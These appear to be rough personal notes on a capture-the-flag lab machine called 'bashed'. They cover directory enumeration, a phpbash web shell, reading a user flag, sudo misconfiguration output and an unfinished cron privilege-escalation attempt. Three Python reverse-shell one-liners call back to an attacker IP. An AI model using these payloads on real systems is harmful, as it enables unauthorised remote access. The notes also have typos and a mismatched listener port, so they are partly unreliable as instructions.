immediately we see awebsite mentioning phpbash

mentions : https://github.com/Arrexel/phpbash

use dirbuster to find /dev dorectory

clicking on phpbash opens a shell

```
www-data@bashed
:/var/www/html/dev# dir

phpbash.min.php phpbash.php
www-data@bashed
:/var/www/html/dev# cd /home

www-data@bashed
:/home# dir

arrexel scriptmanager
www-data@bashed
:/home# cd arrexel

www-data@bashed
:/home/arrexel# dir

user.txt
www-data@bashed
:/home/arrexel# cat user.txt

91cf19ebbfbe2ebad9069db13cda7794
```

shell upgrade , getting a python shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.17",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Local Kali:
```

and youll get reverse at `nc -lvp 1235`
Start with LinEnum.sh to get info about privesc. This section stands out:

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o linenum.sh

```

www-data can sudo as scriptmanager:
We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

for privilege escalation

```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.17\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py


```

not getting root

$ printenv
OLDPWD=/var/www/html/dev
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/dev


### offcial walkthroug

nmap -T4 -A-v 10.10.10.68

result of sudo -l 

```
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

now since the cron job is run as root we need to add a new file inside the script
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.17",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

cant see any crontab
